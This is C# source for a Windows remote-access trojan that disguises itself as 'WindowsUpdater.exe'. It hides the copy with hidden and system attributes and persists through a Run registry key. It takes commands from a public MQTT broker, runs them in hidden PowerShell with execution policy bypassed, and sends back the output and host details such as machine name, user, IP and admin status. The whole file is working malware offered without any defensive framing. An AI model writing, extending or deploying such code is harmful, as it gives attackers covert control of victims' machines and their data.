using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using Microsoft.Win32;
using MQTTnet;
using MQTTnet.Client;
using System.Security.Principal;

class Program
{
    static string secretId = "YOUR_UNIQUE_SECRET_ID_HERE";
    static string machineId = Environment.MachineName + "_" + Environment.UserName;
    static System.Threading.Mutex mutex = new System.Threading.Mutex(true, "RVS_Executor_Mutex_" + machineId);
    static bool isElevated = false; // Tracks if the Executor has elevated privileges

    static async Task Main(string[] args)
    {
        CheckElevation();

        // If we are elevated, kill any existing un-elevated instances so we can take over.
        if (isElevated) {
            foreach (var proc in Process.GetProcessesByName("WindowsUpdater")) {
                try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(1500); } } catch {}
            }
            foreach (var proc in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName))) {
                try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); } } catch {}
            }
        }

        Install(); // Persistence and stealth MUST run first
        
        try {
            if (!mutex.WaitOne(TimeSpan.Zero, true)) return;
        } catch (System.Threading.AbandonedMutexException) {
            // Mutex abandoned because we killed the old owner. We now own it!
        }
        
        if (isElevated)
        {
            Console.WriteLine("Running with elevated privileges.");
        }
        else
        {
            Console.WriteLine("Running with standard privileges.");
        }

        var mqttFactory = new MqttFactory();
        using (var mqttClient = mqttFactory.CreateMqttClient())
        {
            var options = new MqttClientOptionsBuilder()
                .WithTcpServer("broker.hivemq.com")
                .WithClientId(Guid.NewGuid().ToString())
                .Build();

            mqttClient.ApplicationMessageReceivedAsync += async e =>
            {
                string payload = Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment);
                string response = ExecuteCommand(payload);
                
                var message = new MqttApplicationMessageBuilder()
                    .WithTopic($"{secretId}/{machineId}/res")
                    .WithPayload(response)
                    .Build();
                
                await mqttClient.PublishAsync(message);
            };

            await mqttClient.ConnectAsync(options);
            await mqttClient.SubscribeAsync($"{secretId}/{machineId}/cmd");

            // Heartbeat / Discovery
            while (true)
            {
                string info = $"{machineId}|{Environment.OSVersion}|{GetLocalIP()}|{isElevated}";
                var discovery = new MqttApplicationMessageBuilder()
                    .WithTopic($"{secretId}/discovery")
                    .WithPayload(info)
                    .Build();
                await mqttClient.PublishAsync(discovery);
                await Task.Delay(10000);
            }
        }
    }

    static string ExecuteCommand(string cmd)
    {
        try
        {
            // Handle Directory Change (cd)
            if (cmd.Trim().ToLower().StartsWith("cd "))
            {
                string newDir = cmd.Trim().Substring(3).Trim().Replace("\"", "");
                if (newDir == "~") newDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                Directory.SetCurrentDirectory(newDir);
                return $"Changed directory to: {Directory.GetCurrentDirectory()}";
            }

            // Execute via PowerShell for better compatibility (ls, ps, etc)
            Process p = new Process();
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command -";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.StandardOutputEncoding = Encoding.UTF8;
            p.StartInfo.StandardErrorEncoding = Encoding.UTF8;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
            p.Start();

            p.StandardInput.WriteLine("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $ProgressPreference = 'SilentlyContinue'; " + cmd);
            p.StandardInput.Close();

            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();

            return string.IsNullOrEmpty(output) ? error : output;
        }
        catch (Exception ex) { return "Error: " + ex.Message; }
    }

    static void Install()
    {
        try {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string installPath = Path.Combine(appData, "WindowsUpdater.exe");

            if (!exePath.Equals(installPath, StringComparison.OrdinalIgnoreCase)) {
                // Aggressively kill existing instances to allow replacement
                foreach (var proc in Process.GetProcessesByName("WindowsUpdater")) {
                    try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(3000); } } catch {}
                }

                // Small delay to let file locks release
                System.Threading.Thread.Sleep(500);

                if (File.Exists(installPath)) {
                    for (int i = 0; i < 3; i++) {
                        try { File.Delete(installPath); break; } catch { System.Threading.Thread.Sleep(1000); }
                    }
                }
                
                File.Copy(exePath, installPath, true);
                
                // Make it truly hidden (Hidden + System)
                File.SetAttributes(installPath, FileAttributes.Hidden | FileAttributes.System);

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)) {
                    key?.SetValue("WindowsUpdater", $"\"{installPath}\"");
                }

                Process.Start(new ProcessStartInfo(installPath) { 
                    UseShellExecute = true, 
                    CreateNoWindow = true, 
                    WindowStyle = ProcessWindowStyle.Hidden 
                });
                Environment.Exit(0);
            }
        } catch { }
    }

    static void CheckElevation()
    {
        try
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        catch
        {
            isElevated = false;
        }
    }

    static string GetLocalIP() {
        try {
            using (System.Net.Sockets.Socket socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Dgram, 0)) {
                socket.Connect("8.8.8.8", 65530);
                return (socket.LocalEndPoint as System.Net.IPEndPoint).Address.ToString();
            }
        } catch { return "127.0.0.1"; }
    }
}
